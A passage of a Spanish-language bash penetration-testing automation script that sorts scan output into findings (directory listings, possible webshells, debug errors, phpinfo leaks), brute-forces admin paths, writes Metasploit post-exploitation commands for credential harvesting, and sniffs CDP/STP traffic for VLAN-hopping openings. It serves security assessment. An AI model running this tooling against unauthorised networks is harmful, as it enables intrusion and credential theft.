	archivo_destino=${archivo_destino/webarchivos/exposicionUsuarios}
	archivo_destino=${archivo_destino/admin/exposicionUsuarios}   	
    contenido=`echo $line | awk '{print $2}'`        
    echo $contenido >> $archivo_destino        
done

########## revisando Listado de directorios activos ###
#En directorios descubiertos
grep "Listado directorio" .enumeracion2/* 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webdirectorios/listadoDirectorios}   	
	archivo_destino=${archivo_destino/webarchivos/listadoDirectorios}
	archivo_destino=${archivo_destino/admin/listadoDirectorios}   	
    contenido=`echo $line | awk '{print $2}'`    
    #200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done

#En la raiz de los servidores
grep -i "index of" .enumeracion2/* | egrep -v "HTTPSredirect|web_comentario" 2>/dev/null| while read -r line ; do	
	echo -e  "$OKRED[!] Listado de directorio detectado $RESET"	
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
    #archivo_origen= .enumeracion2/seguridad-cod.abc.gob.bo_"$port"_webData.txt -->  url_listado= seguridad-cod.abc.gob.bo:443
    url_listado=`echo $archivo_origen | cut -d "/" -f 2 | cut -d "_" -f1-2 | tr "_" ":"`
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webData/listadoDirectorios}   	
    contenido=`echo $line | awk '{print $2}'`    
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $url_listado >> $archivo_destino        
done
##############################################

########## revisando backdoors ###
grep "Backdoor" .enumeracion2/* 2>/dev/null| while read -r line ; do
	echo -e  "$OKRED[!] Posible backdoor detectado $RESET"	
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webarchivos/webshell}   	    
    contenido=`echo $line | awk '{print $2}'`      
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done
#################################


########## revisando mensaje de error ###
grep -i "Mensaje de error" .enumeracion2/* 2>/dev/null| while read -r line ; do
	echo -e  "$OKRED[!] Mensaje de error detectado $RESET"	
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/.vulnerabilidades}   
	archivo_destino=${archivo_destino/webarchivos/debugHabilitado}   
	archivo_destino=${archivo_destino/webdirectorios/debugHabilitado}   		   
    url_error=`echo $line | awk '{print $2}'`    
    #200 http://1.2.3.4:80/assets/
    #echo "contenido $contenido"
    echo $url_error >> $archivo_destino
	echo "" >> $archivo_destino
	curl $url_error | egrep "undefined function|Fatal error|Uncaught exception|No such file or directory|Lost connection to MySQL|mysql_select_db|ERROR DE CONSULTA|no se pudo conectar al servidor|Fatal error:|Uncaught Error:|Stack trace|Exception information" -m1 -b10 -A10 >> $archivo_destino
done
#################################


########## Phpinfo ###
grep "phpinfo" .enumeracion2/* 2>/dev/null| while read -r line ; do	 # Obtener los archivos marcados como  phpinfo
	#200	http://192.168.50.154:80/img/ (Phpinfo)	 TRACE
	echo -e  "$OKRED[!] Archivos phpinfo $RESET"		
    archivo_origen=`echo $line | cut -d ':' -f1`
    #echo "archivo_origen $archivo_origen"
    archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/.enumeracion2/logs\/enumeracion}  # de este directorio se prueba si es un phpinfo de verdad 
	archivo_destino=${archivo_destino/webdirectorios/divulgacionInformacion}
	archivo_destino=${archivo_destino/webarchivos/divulgacionInformacion}	
    contenido=`echo $line | awk '{print $2}'`        
    #echo "contenido $contenido"
    echo $contenido >> $archivo_destino        
done


# insertar datos 
insert_data



########## extrayendo informacion de divulgacionInformacion ###
for archivo in `ls logs/enumeracion/*_divulgacionInformacion.txt 2>/dev/null;`; do	
	#archivo = logs/enumeracion/190.186.131.162_"$port"_divulgacionInformacion.txt	
	#archivo2 = 190.186.131.162_"$port"_divulgacionInformacion.txt
	archivo2=`echo $archivo | cut -f3 -d"/"`	
	ip=`echo $archivo2 | cut -f1 -d"_"`
	port=`echo $archivo2 | cut -f2 -d"_"`
		
	for url in `cat $archivo`; do	
		#echo "url $url"
		#logs/vulnerabilidades/104.198.171.232_80_divulgacionInformacion.txt:
	   #if [[ (${url} == *"linux"* || ${device} == *"Ubuntu"*  || ${device} == *"Linux"* ) && (${device} != *"linux host"* )]];then 
		if [[ ${url} == *"error"* || ${url} == *"log"* || ${url} == *"dwsync"*  ]];then  			
			echo -e  "$OKRED[!] Archivo de error o log detectado! ($url) $RESET"			
			echo $url >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			echo "" >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
		else
			echo -e "[+] Posible archivo PhpInfo ($url)" 
			phpinfo.pl -url "\"$url\"" > logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt 2>/dev/null	
			
			egrep -iq "No es un archivo PHPinfo" logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			greprc=$?
			if [[ $greprc -eq 1 ]] ; then													
				echo -e  "$OKRED[!] Es un archivo phpinfo valido ! $RESET"
				echo "URL  $url" >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
				echo ""  >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
				cat logs/vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
				echo -e "\n\n"  >> .vulnerabilidades/"$ip"_"$port"_divulgacionInformacion.txt
			else
				echo -e "[i] No es un archivo phpinfo valido"
			fi	#archivo phpinfo
		fi	
	done  								
done
insert_data
#################################

echo  "background" >> command-metasploit.txt
echo "spool `pwd`/metasploit/IP-creds.txt" > command-metasploit.txt
echo  "sessions -i X" >> command-metasploit.txt
echo "resource /usr/share/lanscanner/postExploiter/creds.rc" >> command-metasploit.txt
echo  "background" >> command-metasploit.txt
echo "spool `pwd`/metasploit/IP-enum.txt" > command-metasploit.txt
echo "setg SESSION X" >> command-metasploit.txt
echo "resource /usr/share/lanscanner/postExploiter/enum.rc" >> command-metasploit.txt

if [ -f servicios/admin-web.txt ]
then
	
	echo -e "$OKBLUE [i] Identificando paneles de administracion $RESET"
	for line in $(cat servicios/admin-web.txt); do
		echo -e "\n\t########### $line #######"		
		####### Identificar tipo de panel de admin				
		ip=`echo $ip_port | cut -d ":" -f 1` #puede ser subdominio tb
		port=`echo $ip_port | cut -d ":" -f 2`		
		ip_port=`echo $line | cut -d "/" -f 3` # 190.129.69.107:80			

		path=`echo $line | cut -d "/" -f 4-5`		
		echo "webData.pl -t $ip -d "/$path/" -p $port -e todo -l /dev/null -r 4" 2>/dev/null	
		web_fingerprint=`webData.pl -t $ip -d "/$path/" -p $port -e todo -l /dev/null -r 4 2>/dev/null`	
		web_fingerprint=`echo "$web_fingerprint" | tr '[:upper:]' '[:lower:]' | tr -d ";"` # a minusculas y eliminar  ;		
		#############
			

		echo "$line;$web_fingerprint" >> servicios/admin-web2.txt	
		
		if [[ ${path} != *"."* && ${web_fingerprint} != *"index of"* ]];then  # si es un directorio (no un archivo) y el listado de directorios no esta habilitado
			egrep -i "apache|nginx" .enumeracion2/"$ip"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs|webadmin|owa" # solo el segundo egrep poner "-q"
			greprc=$?
			# si no es tomcat/phpmyadmin/joomla descubrir rutas de 2do nivel accesibles
			if [[ $greprc -eq 0 && $web_fingerprint != *"tomcat"* && $web_fingerprint != *"phpmyadmin"*  && $web_fingerprint != *"joomla"*  && $web_fingerprint != *"wordpress"* && $web_fingerprint != *"cms"*  && $web_fingerprint != *"sqlite"* && $line != *"Listado directorio"* && $line != *".php"*  && $line != *".html"*  ]];then 
				echo -e "\t[i] Buscar mas archivos y directorios dentro de $ip:$port/$path/"
				web-buster.pl -t $ip -p $port -h 50 -d /$path/ -m apacheServer >> logs/vulnerabilidades/"$ip"_"$port"_perdidaAutenticacion.txt
				egrep --color=never "^200" logs/vulnerabilidades/"$ip"_"$port"_perdidaAutenticacion.txt | awk '{print $2}' >> .vulnerabilidades/"$ip"_"$port"_perdidaAutenticacion.txt
			else
				echo -e "\t[i] CMS identificado o es un archivo"
			fi
		else
			echo -e "\t[i] El listado de directorios esta habilitado o es un archivo"
		fi # Es directorio								
	done		
fi		
sort servicios/admin-web2.txt 2>/dev/null | uniq > servicios/admin-web.txt 
rm servicios/admin-web2.txt 2>/dev/null
insert_data	

    

# if [ $internet == "n" ]; then 	

if [[ $VPN == "1" ]]; then

 echo "Escaneando desde VPN. No snifear"

else
# Protocolos DoS
# eigrp
# ospf
# hsrp

    if [[ $internet == "n"  ]] ; then 
       echo "Snifear"
		
		MANDOM=""
		NATID=""
		DEVID=""
		MANIP=""
		CDPON=""

		echo -e "$OKBLUE[i] Snifeando la red  en busca de paquetes CDP. Por favor espere 90 segundos $RESET"
		echo ""
		OUTPUT="`tshark -a duration:90 -i $iface -Y \"cdp\" -V 2>&1 | sort --unique`"

		echo "$OUTPUT" > logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
		echo "" >> logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
		printf -- "${OUTPUT}\n" | while read line
		do
		echo "line $line"
			case "${line}" in
				*captured*)
					
					CDPON="`printf -- \"${line}\n\" | grep "0 packets"`"
					
					if [ "$CDPON" = "0 packets captured" ]
					then
						echo -e "No se encontraron paquetes CDP" | tee -a logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
						echo ""					
					fi
					;;
					VTP\ Management\ Domain:*)
					if [ -n "$MANDOM" ]
						then
							continue
					fi
					MANDOM="`printf -- \"${line}\n\" | cut -f2 -d\":\" |sed 's/^[ \t]*//;s/[ \t]*$//'`"
					if [ "$MANDOM" = "Domain:" ]
						then
							echo -e "El dominio VTP parece estar configurado en NULL en el dispositivo."
							echo ""
					elif [ -z "$MANDOM" ]
						then
							echo -e " No encontré ningún dominio de administración VTP dentro de los paquetes CDP. Posiblemente CDP no está habilitado." | tee -a logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
							echo ""
					else
						echo -e "Management domains:$MANDOM"
					fi
					;;
				Native\ VLAN:*)
					if [ -n "$NATID" ]
						then
							continue
					fi	
					NATID="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
					if [ -z "$NATID" ]
						then
							echo -e "No encontré ninguna ID de VLAN nativa en los paquetes CDP. Quizás CDP no esté habilitado." | tee -a logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
							echo ""
						else
							echo -e "VLAN ID: $NATID" >> .vulnerabilidades/"red"_"ninguno"_vlanHop.txt
					fi

					;;
				*RELEASE\ SOFTWARE*)
					if [ -n "$DEVID" ]
					then
						continue
					fi
					DEVID="`printf -- \"${line}\n\" | awk '{sub(/^[ \t]+/, ""); print}'`"
					if [ -z "$DEVID" ]
						then
							echo -e "No encontré ningún dispositivo. Quizás no sea un dispositivo Cisco." | tee -a logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
							echo ""
						else
							echo -e "Se encontró el siguiente dispositivo Cisco $DEVID"	>> .vulnerabilidades/"red"_"ninguno"_vlanHop.txt				
		
					fi

					;;
				IP\ address:*)
					if [ -n "$MANIP" ]
						then
							continue
					fi
					MANIP="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
					if [ -z "$MANIP" ]
						then
							echo -e "No encontré ninguna dirección de administración dentro de los paquetes CDP" | tee -a logs/vulnerabilidades/"red"_"ninguno"_vlanHop.txt
							exit 1
						else
							echo -e "Se encontraron las siguientes direcciones IP de administración $MANIP" >> .vulnerabilidades/"red"_"ninguno"_vlanHop.txt
							echo $MANIP
							echo ""
					fi
				;;
			esac
		done

		echo ""
		echo -e "$OKBLUE [i] Snifeando la red  en busca de paquetes STP. Por favor espere 90 segundos $RESET"
		echo ""
		OUTPUT="`tshark -a duration:90 -i $iface -Y \"stp\" -V 2>&1 | sort --unique`"
		
		echo "$OUTPUT" > logs/vulnerabilidades/"red"_"ninguno"_stp.txt
		echo "" >> logs/vulnerabilidades/"red"_"ninguno"_stp.txt
		printf -- "${OUTPUT}\n" | while read line
		do
			echo "line $line"
			case "${line}" in
				*captured*)            
				STP="`printf -- \"${line}\n\" | grep "0 packets"`"
				if [ "$STP" = "0 packets captured" ]
				then
					echo -e "No se encontraron paquetes STP" | tee -a logs/vulnerabilidades/"red"_"ninguno"_stp.txt
					echo ""					
				else
					echo -e "Se encontraron paquetes STP" | tee -a .vulnerabilidades/"red"_"ninguno"_stp.txt
					echo ""	
				fi
			esac
		done		
		insert_data
		   
    else    
       echo "Escaneando desde internet. No snifear"
    fi	
    
fi



echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
#grep -ira "timed out" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
#grep -ira "Can't connect" * logs/enumeracion/* 2>/dev/null | egrep -v "webClone|transfer not allowed" >> errores.log
grep -ira failed logs/vulnerabilidades/* | egrep -v "404 Not Found|Connection refused|No route to host"
